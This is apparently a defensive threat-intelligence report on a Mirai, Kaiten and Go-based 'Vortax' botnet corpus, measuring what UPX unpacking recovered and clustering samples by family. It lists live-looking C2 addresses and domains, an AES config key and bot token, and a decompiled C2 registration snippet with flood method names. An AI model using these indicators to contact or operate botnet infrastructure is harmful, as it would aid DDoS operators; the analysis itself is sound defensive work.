# `mirai_unpacked_and_renamed3` — malware family report

Companion to [`mirai7_family_report.md`](mirai7_family_report.md). Same corpus,
same method, one difference: the operator ran `upx -d` over the packed samples
before ingest, and preserved the **packed** MD5 in the filename
(`boatnet.arm7; 671e9d728437b0597b3bfccd6ee1b51f`). That single convention makes
the two collections joinable, so this is not just a second family report — it is
a controlled measurement of **what packing cost the first one**.

Analysis performed entirely through the BSimVis REST API (`localhost:5001/api`),
collection `mirai_unpacked_and_renamed3`, algo `unweighted_cosine`. Read-only, no
jobs triggered. Date of analysis: 2026-07-28.

Three companions carry the per-family detail:

- [`unpacked3_kaiten_timeline.md`](unpacked3_kaiten_timeline.md) — Kaiten/STD, now 20 files and **three** generations
- [`unpacked3_mirai_timeline.md`](unpacked3_mirai_timeline.md) — Mirai proper, now **13** symbolised seeds instead of 4
- [`unpacked3_vortax_xnxn_timeline.md`](unpacked3_vortax_xnxn_timeline.md) — Vortax and `xnxn`, the two families with no history: Go symbol lineage, and an AES-encrypted config cracked

---

## 1. Collection at a glance

> **Pivot** — `index/status?collection=…` to size it, then **one**
> `file/search?collection=…&limit=300` for everything in this section. Same first
> move as in the mirai7 report; it has not stopped being the right one.

| Metric | `mirai7` | `mirai_unpacked_and_renamed3` |
|---|---:|---:|
| Files | 174 | **257** |
| Functions | 34 503 | **107 085** |
| Indexed | 34 245 (99.25 %) | 106 861 (99.79 %) |
| BSim features | 172 039 | **434 391** |
| Files under 10 functions (packer stubs) | **54** | **2** |
| First / last seen | 2025-04-04 → 2026-05-19 | 2025-04-04 → **2026-05-31** |
| Hash-named files | 43 | 65 |

Architecture spread (14 Ghidra language IDs, unchanged shape — a cross-compilation matrix):

| Arch | Files | | Arch | Files |
|---|---:|---|---|---:|
| ARM:LE:32:v8 | 62 | | x86:LE:64 | 16 |
| MIPS:LE:32 | 44 | | 68000:BE:32 (Coldfire) | 16 |
| MIPS:BE:32 | 34 | | sparc:BE:32 | 8 |
| x86:LE:32 | 29 | | AARCH64 | 4 |
| SuperH4:LE:32 | 18 | | MIPS:LE:64 | 3 |
| PowerPC:BE:32:e500 | 17 | | Loongarch64 / RISCV32 / RISCV64 | 2 / 2 / 2 |

**Read the AV labels as data.** That was the lesson of the first report (the 15
`Tsunami` labels were a whole second family hiding in plain sight). It pays off
again here, in a different direction:

| AV label | Files |
|---|---:|
| `Unix.*.Mirai-*` (12 distinct signatures) | 176 |
| `Unix.Trojan.Tsunami-*` | 21 |
| **`OK`** — *scanned, nothing found* | **39** |

39 files that ClamAV clears. Eight of them are a botnet family that does not
exist in `mirai7` at all (§5). `OK` is not "clean", it is "not in the signature
set", and in this corpus it is the single most interesting label to sort by.

C2 IPs in metadata: `202.155.10.112` (8 files), `143.20.185.245` (8 files) — the
latter is the loader IP already documented in mirai7 §9. A third C2 is recovered
from code rather than metadata in §5.

## 2. Provenance — how the 257 files relate to the 174

> **Pivot** — no API call at all. `file_name` carries the packed MD5 after a
> `;`. Parse it, join against a `file/search` dump of `mirai7`, done. This is the
> only step in the whole report that depends on the operator's naming
> convention, and it is the step everything else hangs off. **Convention as
> metadata: worth institutionalising.**

```python
hex32 = re.compile(r'^[0-9a-f]{32}$')
def packed_md5(f):                       # "boatnet.arm7; 671e9d72…" -> "671e9d72…"
    n = f['file_name'].strip()
    cand = n.split(';')[-1].strip() if ';' in n else n
    return cand if hex32.match(cand) else None
```

| Bucket | Files |
|---|---:|
| Carried over from `mirai7`, byte-identical | 119 |
| **Unpacked — packed twin present in `mirai7`** | **55** |
| Unpacked — packed twin *not* in `mirai7` | 16 |
| New sample, never packed | 67 |

So 83 files are new material, and 55 are the same binaries the first report could
not read. Those 55 are the controlled experiment.

## 3. What unpacking actually bought — the headline measurement

The mirai7 report spent its §2 and §2.1 arguing that the packed half of the
collection was *analytically empty* and that it *poisoned the clustering*. Both
claims are now measurable rather than asserted.

**Code recovered, across the 55 matched pairs:**

| | packed (`mirai7`) | unpacked (this collection) |
|---|---:|---:|
| Total functions | **231** | **12 446** |
| Median functions per file | 4 | 200 |
| Largest single file | 11 | 564 |
| Recovered symbol names | 0 | **1 619** |

**54× more code.** The packed corpus exposed a mean of 4.2 functions per sample —
a UPX entry stub and a helper. Everything a similarity engine could have said
about those 55 files in `mirai7` was a statement about UPX.

The extremes are worth naming individually, because they are the samples the
first report explicitly gave up on:

| Sample | Arch | fns packed → unpacked | names recovered |
|---|---|---:|---:|
| `762ef228…` | ARM | 2 → **564** | 1 |
| `aa815409…` | PowerPC | 5 → **524** | 1 |
| `76967ae2…` | ARM | 2 → **516** | 1 |
| `412addf4…` | MIPS | 4 → **509** | 1 |
| `wife.mpsl; 315a79aa…` | MIPS | 6 → **491** | 1 |
| `673c690d…` | ARM | 2 → **405** | **402** |
| `parm7; 91e42ffd…` | ARM | 5 → **320** | **318** |
| `parm7; 60a848d3…` | ARM | 4 → **312** | **310** |
| `boatnet.arm7; 0cf8ec8d…` | ARM | 2 → **249** | **249** |
| `boatnet.arm7; 671e9d72…` | ARM | 2 → **235** | **235** |

The mirai7 report used `boatnet.arm7` as its worked example of a degenerate
file: *"sorting the filtered set ascending returns `boatnet.arm7` (**2
functions**) paired with `nuclear.arm7` (396)"*. That same binary is a fully
symbolised Mirai build with **24 `attack_method_*` entries**. It was never a
degenerate file; it was a packed one.

**Symbols survive UPX.** Five of the 55 came back with their symbol table intact
(402, 318, 310, 249, 235 names). Nothing in the packed view hinted at this — the
stub carries no symbols either way, so a symbol-based triage on `mirai7` could
not distinguish "stripped" from "packed and symbolised". More than tripling the
symbolised Mirai seed count (4 → 13, see the Mirai timeline) came almost
entirely from these five plus their unpacked siblings.

### 3.1 The stub contamination is gone

`mirai7` §2.1's central complaint: 54 stub files produced 26 of the 50 leaf
binary clusters and ~1 400 perfect-score pairs, and no server-side filter would
remove them cleanly. In this collection:

- files under 10 functions: **2** (down from 54)
- `min_funcs=50` on `bin_sim/search` returns 32 881 pairs that are all real code
- the top of the score-sorted list is now `boatnet.x86` vs `boatnet.x86`
  at 1.000 over **134 shared clusters** (`boatnet.x86; e92826d3…` vs
  `boatnet.x86; bb63cf4f…`) — a genuine duplicate build, not a packer header

Every workaround catalogued in mirai7 §2.1 became unnecessary. That is the
practical finding of this report and it is worth stating bluntly: **the fix for
the stub problem was not an API filter, it was `upx -d` before ingest.** The
feature request stands anyway (skip similarity builds for binaries under N
functions), but as a guard against sloppy ingest, not as the analyst's tool.

Caveat, honestly: 72 files still carry the `UPX_Protector` YARA hit, because the
YARA metadata was captured at original submission and travels with the record.
The hit no longer means the *indexed* bytes are packed. Anyone filtering on
`yara=UPX_Protector` in this collection will get the wrong answer — 71 of those
72 files are fully unpacked.

## 4. Family census

> **Pivot** — three tiers, applied in order, each one cheaper than the analysis
> it replaces. Tier 1 is `function/search?collection=…&limit=120000` (one call,
> 45 s, 357 MB) aggregated client-side; tiers 2 and 3 need no further calls.

1. **Symbol vocabulary** — the 59-name Kaiten set from the mirai7 timeline, a
   `^(attack_|table_|xor_|scanner_|killer_|util_|checksum_|rand_|resolve_cnc|anti_gdb|watchdog)`
   regex for Mirai, `^vortax` for the new family. 142 files decided.
2. **Campaign name** — a filename campaign (`boatnet`, `DEMONS`, `nuclear`) whose
   labelled members all agree gets extended to its unlabelled siblings. 33 files.
3. **Function-cluster Jaccard** — nearest labelled neighbour over function-cluster
   membership with the 11 ubiquitous clusters removed, threshold 0.4. 48 files.

| Family | Files | Arch spread | Evidence |
|---|---:|---|---|
| **Mirai** | 195 | ARM 54, MIPS 62, x86 37, SH4 13, PPC 13, m68k 10, sparc 6 | 13 symbolised seeds |
| **Kaiten / STD** (`Tsunami`) | 20 | MIPS 8, ARM 5, x86 3, PPC 2, m68k 1, SH4 1 | 59-symbol vocabulary |
| **Vortax** (new, Go) | 8 | MIPS 4, ARM 3, x86 1 | `vortax_server` package symbols |
| Unattributed | 34 | 9 arches, mostly the `xnxn…` campaign | see §6 |

Against `mirai7` (164 Mirai / 10 Kaiten): Kaiten doubled, Mirai grew by a third,
and a third family appeared.

## 5. The new family: **Vortax** — a Go bot, and ClamAV does not know it

Eight files, ~4 400 functions each, statically linked Go. They are not in
`mirai7` in any form — not packed, not renamed, not present. Every one is
labelled `OK` by ClamAV and hits no YARA rule.

> **Pivot** — the tier-1 symbol dump did all of this. Bucket
> `function_name.split('.')[0]` per file with `collections.Counter` and the
> non-stdlib package name falls straight out. No decompilation needed to *find*
> the family; decompilation only confirms it.

```
runtime 1334 | crypto 1240 | net 314 | internal 263 | reflect 120 | …
vortax_server 21   ← everything that is not the Go standard library
```

Ghidra's Go support recovers the full source layout from the build metadata:

| Source file | Symbols |
|---|---|
| `/root/wichtig/bot.go` | `main.main` + 7 goroutine wrappers |
| `/root/wichtig/Methods/tcp.go` | `Methods.StartTCP` |
| `/root/wichtig/Methods/udp.go` | `Methods.StartUDP` |
| `/root/wichtig/Methods/pps.go` | `Methods.StartPPS` |
| `/root/wichtig/Methods/priv7.go` | `Methods.Priv7Flood` |
| `/root/wichtig/Methods/discord.go` | `Methods.StartDiscord` |
| `/root/wichtig/Methods/dns.go` | `Methods.StartDNS`, `changeToDnsNameFormat` |
| `/root/wichtig/Methods/greip.go` | `Methods.StartGREIP` |

`wichtig` is German for *important* — a developer's working directory name, not
an artefact of the build. Take it as weak attribution signal, nothing more.

**C2 and protocol**, from `main.main` on the x86-64 sample
(`function/code?id=…:func:c57c374c…:0059d960`):

```c
address.str = "5.175.221.69:9111";
mVar15 = net.Dial("tcp", address);
if (err != NULL) { time.Sleep(5000000000); continue; }   /* retry every 5 s */
fmt.Fprintf(conn, "REGISTER %s %s\n", "linux", <arch>);
```

Plaintext TCP, no TLS despite the whole of `crypto` being linked in (the Go
runtime pulls it in via `net/http` regardless of use). `5.175.221.69:9111` is
**not** in any `cc_ip` metadata field in the collection — it exists only in code.
Metadata-driven C2 pivoting would have missed it entirely.

`Priv7Flood` is the only method with recoverable format strings:

```
"[%s] PRIV7 (POST) Attack started on %s for %ds (OPTIMIZED)\n"
"[%s] PRIV7 Attack finished.\n"     ports :80 and :443
```

so it is an HTTP POST L7 flood. `StartDNS` embeds `google.com` as its query name.

### 5.1 Vortax has a dated version drift, in one week

Method inventory per sample, ordered by `first_seen`:

| First seen | Arch | Methods |
|---|---|---|
| 2026-03-26 00:00 | MIPS:BE | TCP, UDP, PPS, Discord, Priv7 — **5** |
| 2026-03-26 21:00 | MIPS:LE:64 | + **StartDNS**, **StartGREIP**, `changeToDnsNameFormat` — **7** |
| 2026-04-05 01:47 | MIPS:LE:64 | 7 |
| 2026-04-05 04:15 ×5 | x86-64, ARM ×3, MIPS:BE | 7 |

Two capabilities added inside 21 hours, then a five-architecture
cross-compilation burst ten days later — three ARM builds, one x86-64, one
MIPS:BE, all with the same `first_seen` to the minute. The 2026-04-05 group
shares 4 016 symbols pairwise; they are one `make` run, exactly like the Kaiten
2026-02-09 set.

### 5.2 A limitation, stated where it bites

Only the **x86-64** sample yields string literals in the decompiler. On ARM,
MIPS and MIPS64, Ghidra recovers Go function names and source paths but not the
string constants (Go materialises them via register-relative address pairs the
decompiler does not fold). So the C2 address is confirmed for 1 of 8 samples and
*assumed* for the other 7 on the strength of an identical symbol set. That is an
inference, not an observation — recorded as such.

## 6. What could not be attributed, and why

34 files resist all three tiers. 22 of them are one campaign: the
`xnxnxnxnxnxnxnxn<arch>xnxn` set, 11 architecture targets × 2 build dates (2026-02-14
and 2026-03-25), function counts identical within each arch pair.

Its nearest labelled neighbour by function-cluster Jaccard is `px86_i686`
(Mirai) at **0.28**, against a background of 0.10 for unrelated files and 0.60+
for confirmed same-family pairs. That is below the threshold this report set in
advance, and moving the threshold after seeing the answer is how §7.4 of the
mirai7 report happened. **Left unattributed, deliberately.**

The follow-up analysis in
[`unpacked3_vortax_xnxn_timeline.md`](unpacked3_vortax_xnxn_timeline.md) says
what that 0.28 was: 79 of the campaign's 257 x86-64 functions sit in clusters
shared with the `p*` Mirai campaign, and **none of them is bot code** — the
dispatcher, the C2 resolver, the AES routines and every flood worker are
`xnxn`-only. Shared static C runtime, not shared lineage. The same report
decrypts the campaign's AES-128-CBC configuration (key
`fd00e82a0a3d86af73deacaa9df16432`, shipped in `.rodata`) and recovers its
C2s — `feather-daddy.duckdns.org:54128` in February,
`itzmeyourbro.duckdns.org:54128` in March, token `fewgjh48iw3hg5uh` throughout.
Config decryption gives the campaign infrastructure and a protocol; it does not
give it a family, and the verdict here stands unchanged.

The remaining 12 files are one-per-architecture stragglers plus two large outliers:
`mipsle` (MIPS64, 1 108 functions, 2026-05-09) and `baf3d3df…` (AARCH64, 932
functions), both statically linked against a runtime the rest of the corpus does
not share, which suppresses every similarity signal available.

For `mipsle` that runtime is now identified, and it is not a libc: **it is Go**.
It shares 260 functions with the Vortax MIPS64 build — `runtime` (122),
`internal`, `crypto`, `net`, `time`, `sync` — and **none** of Vortax's 29
`vortax_server`/`main.*` symbols. It is a stripped 5.4 MB Go binary with no
recoverable strings, `OK` on ClamAV, no YARA hit. Not Vortax, not attributable
here; the binary-cluster cut that groups it with Vortax (cluster 262, cohesion
0.22) is a **Go runtime cut**, which is why it is named
`vortax x7 + mipsle (Go runtime cut)` and not `vortax`.

### 6.1 The libc trap, reproduced exactly

Worth showing because it is the same failure the first report caught, and this
time both methods were run side by side.

Attributing the stripped files by **binary similarity** puts `boatnet.mips` in
Kaiten at score 0.617, nearest neighbour `cock` — a genuine Kaiten sample of the
same architecture. Attributing by **function-cluster overlap with the Kaiten
malware vocabulary** scores it **0** on Kaiten and 0.91 on Mirai.

The binary score is dominated by shared static libc. The cluster method only
counts clusters that a Kaiten *malware* function is in, so it is immune. Same
disagreement, same direction, same cause as mirai7 §7.4 — and the tie-break rule
is unchanged: **a binary-similarity score between two statically linked ELF
binaries is a statement about their libc until proven otherwise.**

The corollary is the cross-ISA blind spot, also unchanged from mirai7 §5:
function clusters are effectively per-architecture here, so a stripped x86 Mirai
build shares nothing with a symbolised ARM Mirai seed. Every Mirai seed with
symbols is ARM or MIPS, which is exactly why the unattributed 34 skew to m68k,
SPARC, RISCV, Loongarch and AARCH64. The gap is in the seed set, not the corpus.

## 7. Binary clustering — how the family splits

175 binary clusters, one dendrogram rooted at cluster 258 (253 of 257 files;
4 files cluster with nothing). Cutting top-down at cohesion ≥ 0.30 gives 27
groups, 17 of them with ≥ 3 members, covering 228 files.

The cut is **architecture-first, family-second** at every level. The largest
coherent groups:

| Cluster | n | Cohesion | Composition |
|---|---:|---:|---|
| 329 | 25 | 0.31 | MIPS, mixed campaigns — `iran.*`, `nova.mipsel`, `mpsl`, hash-named |
| 277 | 8 | 0.30 | m68k — `boatnet.m68k`, `DEMONS.m68k`, `pm68k` |
| 324 | 8 | 0.31 | x86 — `boatnet.x86`, `DEMONS.x86`, `nuclear.x86` |
| 296 | 6 | 0.52 | x86 — `px86_i686`, `px86_i486`, `xnxn…i386` |
| 304 | 6 | 0.32 | **Loongarch + RISCV32 + RISCV64 together** — the `xnxn…` exotics |
| 286 | 4 | 0.68 | SuperH — `xnxn…sh4` + `xnxn…sh2` |
| 270 | 2 | **1.00** | sparc — `boatnet.spc` ×2, identical |

Cluster 304 is the one interesting exception: three *different* ISAs
(Loongarch64, RISCV32, RISCV64) grouped at 0.32. These are the newest, least
optimised targets — the compiler emits near-textbook code and BSim's
architecture independence finally shows through. It does not happen anywhere
else in the corpus.

## 8. Campaigns

| Campaign | Files | Arches | Family | Window |
|---|---:|---:|---|---|
| `boatnet` | 47 | 7 | Mirai | 2026-03-28 → 2026-05-08 |
| `DEMONS` | 18 | 7 | Mirai | 2026-03-29 → 2026-04-03 |
| `nuclear` | 13 | 7 | Mirai | 2026-03-18 → 2026-03-24 |
| `xnxn…` | 22 | 11 | *unattributed* | 2026-02-14, 2026-03-25 |
| `p*` (`pmips`, `parm7`, `px86_64`, …) | 37 | 6 | Mirai | 2026-02-16 → 2026-03-23 |
| `iran` | 3 | 2 | Mirai | 2026-02-24 → 2026-05-01 |
| `*net` (`gaynet`, `weednet`, `ballnet`, …) + `cock` | 11 | 8 | Kaiten | 2026-02-09 (one day) |

Two campaigns deserve a note:

- **`boatnet` is not one thing.** `boatnet.arm7`, `boatnet.arm6`, `boatnet.x86`
  etc. with a packed-MD5 suffix are Mirai with the `attack_method_*` dialect.
  The bare `boatnet.mips` / `boatnet.mipsrouter` / `boatnet.m68k` files (no
  suffix, never packed, 465–623 functions) are a *different, larger* build that
  shares no malware clusters with them. Same operator naming, two code bases.
- **`upnnpd` and `miniiupnpd`** (2026-04-24, MIPS BE and LE, 496/491 functions)
  are Mirai builds named after the MiniUPnP daemon. Cluster-Jaccard 0.91 to
  `boatnet.mips`. Filename-based triage would file them as router firmware.

## 9. Conclusions

1. **Unpacking before ingest is worth more than any filter the API could offer.**
   231 → 12 446 functions over the same 55 binaries, 1 619 symbol names, and the
   entire class of complaints in mirai7 §2.1 disappears.
2. **Preserving the packed MD5 in the filename made the two collections
   joinable.** Every comparative number in this report exists because of a
   `; <md5>` suffix. It cost the operator nothing and it should be a documented
   convention, not a habit.
3. **A third family was hiding behind an `OK` AV label.** Vortax: Go, 8 samples,
   4 architectures, own C2 (`5.175.221.69:9111`), a capability change inside 21
   hours, zero AV and zero YARA coverage. `mirai7` did not contain it.
4. **Kaiten doubled and gained a third generation** (2026-04, 2026-05) that
   *removes* the anti-mitigation arsenal the 2026-02 build added — the first
   backwards step in that family's history. See the Kaiten timeline.
5. **Symbolised Mirai seeds went from 4 to 13, almost entirely via unpacking**,
   which turns the Mirai side from a clustering exercise into a readable
   capability history. See the Mirai timeline.
6. **The two methodological traps from the first report both reproduced
   exactly** — the libc-dominated binary score (§6.1) and the cross-ISA blind
   spot (§6). Neither is fixed by unpacking. They are the next thing to fix.
7. **The `xnxn` campaign's config is decryptable and its C2 rotated** —
   AES-128-CBC with the key in `.rodata`: `feather-daddy.duckdns.org:54128` in
   February, `itzmeyourbro.duckdns.org:54128` in March, token
   `fewgjh48iw3hg5uh` in both. The rebuild changed **one function out of 257**,
   and 10 of the 11 architecture pairs still score a perfect 1.000 in
   `bin_sim` — a reminder that binary similarity cannot see configuration.
   It remains unattributed as a family (§6). See the Vortax/`xnxn` timeline.

### Recommended follow-ups

- Pivot on `5.175.221.69` and `feather-daddy.duckdns.org` /
  `itzmeyourbro.duckdns.org` outside this corpus — active C2 hosts with limited
  or no detection coverage. For `xnxn`, retrohunt the AES key rather than the
  domains: the key survived the rotation, the domains did not.
- Attribute the `xnxn` campaign properly. It needs one symbolised sample or a
  cross-ISA-capable comparison; the toolchain overlap with `p*` is not lineage.
- Re-run the mirai7 conclusions that rested on packed samples. Any statement
  about the 55 was a statement about UPX.
- Feature request, restated from mirai7 §2.1 and still valid: skip similarity
  builds under N functions, and make unknown query parameters a 400 rather than
  a silent no-op.
